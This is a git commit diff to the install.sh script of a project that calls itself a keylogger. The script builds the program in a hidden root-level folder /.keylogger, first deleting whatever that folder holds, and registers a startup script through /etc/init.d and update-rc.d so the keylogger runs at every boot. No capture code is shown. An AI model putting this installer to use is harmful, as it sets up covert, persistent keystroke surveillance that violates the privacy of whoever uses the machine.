c086435d492aabb18e9594cef4c93550da5a0aa0
Matias Grioni <matgrioni@gmail.com>
2016-11-28 21:02:24 -0500

    Fixed more paths and added comments

--- install.sh
+++ install.sh
@@ -4,13 +4,18 @@
 # Install libpcap-dev if it is already not on the system.
 sudo apt-get install libpcap0.8-dev
 
+# Create the folder where the keylogger will live. If it already
+# exists then delete all containing files.
 sudo mkdir /.keylogger
+sudo rm /.keylogger/*
 sudo cp -r . /.keylogger
-cd /home/.keylogger
+cd /.keylogger
 
 # Create the binaries.
 make
 
+# Copy the startup script to the appropriate location and add it to
+# the list of scripts to start automatically.
 chmod +x keylogger.sh
-sudo mv keylogger.sh /etc/init.d/
+sudo cp keylogger.sh /etc/init.d/
 sudo update-rc.d keylogger.sh defaults
